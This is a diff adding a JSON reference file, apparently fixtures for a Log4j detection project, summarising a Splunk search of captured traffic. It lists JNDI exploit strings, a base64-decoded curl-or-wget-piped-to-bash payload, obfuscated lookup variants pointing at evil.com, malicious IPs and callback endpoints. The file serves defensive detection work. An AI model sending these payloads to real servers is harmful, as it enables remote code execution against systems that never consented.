@@ -1,0 +1,41 @@
+{
+  "description": "Reference data extracted from the real Splunk PDF report at /Users/josephstafford/repo/codepath_screenshots/log4j_regex_search-2026-07-28-1.pdf",
+  "extracted_at": "2026-07-29",
+  "jndi_payload_examples": [
+    "${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xOTguNzEuMjQ3LjkxOjgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzE5OC43MS4yNDcuOTE6ODApfGJhc2g=}",
+    "${jndi:ldap://121.140.99.236:1389/Exploit}",
+    "${jndi:ldap://31.131.16.127:1389/Exploit}",
+    "${jndi:ldap://5.101.118.127:1389/Exploit}"
+  ],
+  "base64_decoded_payload": "(curl -s 195.54.160.149:5874/198.71.247.91:80||wget -q -O- 195.54.160.149:5874/198.71.247.91:80)|bash",
+  "obfuscation_examples": [
+    {"raw": "${lower:j}ndi:ldap://evil.com/a", "normalized": "jndi:ldap://evil.com/a"},
+    {"raw": "${upper:j}ndi:${lower:l}dap://evil.com", "normalized": "jndi:ldap://evil.com"},
+    {"raw": "${::-j}${::-n}di:ldap://host.com:1389/Exploit", "normalized": "jndi:ldap://host.com:1389/Exploit"},
+    {"raw": "${${lower:l}dap://10.0.0.1:1389/x}", "normalized": "ldap://10.0.0.1:1389/x"}
+  ],
+  "known_malicious_ips": [
+    "195.54.160.149", "175.6.210.66", "104.248.144.120",
+    "46.105.95.220", "5.157.38.50", "191.232.38.25",
+    "107.189.1.178", "198.71.247.91", "147.182.202.30"
+  ],
+  "callback_endpoints": [
+    {"endpoint": "195.54.160.149:12344", "count": 56, "type": "base64_callback"},
+    {"endpoint": "31.131.16.127:1389", "count": 24, "type": "ldap_callback"},
+    {"endpoint": "5.101.118.127:1389", "count": 24, "type": "ldap_callback"},
+    {"endpoint": "121.140.99.236:1389", "count": 12, "type": "ldap_callback"},
+    {"endpoint": "71ssmbjqg7ezpoqt8okre7gzu.canarytokens.com", "count": 4, "type": "canarytoken"}
+  ],
+  "injection_points": {
+    "URI / Request Body": 120
+  },
+  "timeline": {
+    "earliest": "2026-07-24T22:48:40Z",
+    "latest": "2026-07-28T17:17:22Z",
+    "event_dates": ["2026-07-24", "2026-07-26", "2026-07-27", "2026-07-28"]
+  },
+  "source_distribution": {
+    "pcapA.json": 28,
+    "pcapB.json": 92
+  }
+}
